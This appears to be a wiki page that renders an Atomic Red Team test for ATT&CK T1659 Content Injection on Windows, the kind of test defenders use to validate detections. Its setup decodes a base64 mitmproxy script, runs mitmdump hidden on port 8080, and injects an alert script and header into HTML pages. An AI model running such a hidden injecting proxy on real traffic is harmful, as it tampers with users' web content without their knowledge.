---
atomic_guid: "dcc2ca85-a21c-43a4-acc7-7314d4e5891c"
title: "MITM Proxy Injection (Windows)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1659"
attack_technique_name: "Content Injection"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1659/T1659.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "dcc2ca85-a21c-43a4-acc7-7314d4e5891c"
  - "MITM Proxy Injection (Windows)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# MITM Proxy Injection (Windows)

Start mitmdump proxy with injection script in the background.

## Metadata

- Atomic GUID: dcc2ca85-a21c-43a4-acc7-7314d4e5891c
- Technique: T1659: Content Injection
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1659/T1659.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1659-content_injection|T1659]]

## Dependencies

Python must be installed

### Prerequisite Check

```untitled
if (Get-Command python -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```untitled
winget install --id Python.Python.3 -e
```

curl must be installed

### Prerequisite Check

```untitled
if (Get-Command curl.exe -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```untitled
winget install --id cURL.cURL -e
```

mitmproxy must be installed and in PATH

### Prerequisite Check

```untitled
if (Get-Command mitmdump -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```untitled
python -m pip install mitmproxy
```

mitmdump must be running on port 8080

### Prerequisite Check

```untitled
if (Get-NetTCPConnection -LocalPort 8080 -ErrorAction SilentlyContinue | Where-Object { (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name -like "*mitmdump*" }) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```untitled
$code = 'ZnJvbSBtaXRtcHJveHkgaW1wb3J0IGh0dHANCmRlZiByZXNwb25zZShmbG93OiBodHRwLkhUVFBGbG93KToNCiAgICBpZiAidGV4dC9odG1sIiBpbiBmbG93LnJlc3BvbnNlLmhlYWRlcnMuZ2V0KCJjb250ZW50LXR5cGUiLCIiKToNCiAgICAgICAgZmxvdy5yZXNwb25zZS5oZWFkZXJzWyJYLUF0b21pYyJdPSJUMTY1OSINCiAgICAgICAgZmxvdy5yZXNwb25zZS50ZXh0ID0gZmxvdy5yZXNwb25zZS50ZXh0LnJlcGxhY2UoIjwvYm9keT4iLCAiPHNjcmlwdD5hbGVydCgnQXRvbWljIFQxNjU5IEluamVjdGlvbicpPC9zY3JpcHQ+PC9ib2R5PiIp'
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($code)) | Out-File -FilePath "$env:TEMP\atomic_t1659_inject.py" -Encoding ascii
Start-Process -FilePath "mitmdump" -ArgumentList @("-s", "$env:TEMP\atomic_t1659_inject.py", "-p", "8080") -RedirectStandardOutput "$env:TEMP\atomic_t1659.log" -RedirectStandardError "$env:TEMP\atomic_t1659.log" -WindowStyle Hidden
Start-Sleep -Seconds 5
if (Get-NetTCPConnection -LocalPort 8080 -ErrorAction SilentlyContinue | Where-Object { (Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name -like "*mitmdump*" }) { exit 0 } else { Get-Content "$env:TEMP\atomic_t1659.log"; exit 1 }
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
curl.exe -skI --proxy http://127.0.0.1:8080 http://example.com | Tee-Object -FilePath "$env:TEMP\curl_out.txt"
if (-not (Select-String -Path "$env:TEMP\curl_out.txt" -Pattern "X-Atomic")) { Write-Error "Header not found"; exit 1 }
$OutPath = "$env:TEMP\atomic_t1659_page.html"
curl.exe -sk --proxy http://127.0.0.1:8080 http://example.com | Out-File -FilePath $OutPath -Encoding utf8
$Content = Get-Content -Path $OutPath -Raw
if ($Content -notmatch "Atomic T1659 Injection") { exit 1 }
```

### Cleanup

```powershell
Stop-Process -Name "mitmdump" -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\atomic_t1659_inject.py" -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\atomic_t1659.log" -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\curl_out.txt" -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\atomic_t1659_page.html" -ErrorAction SilentlyContinue
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1659/T1659.yaml)
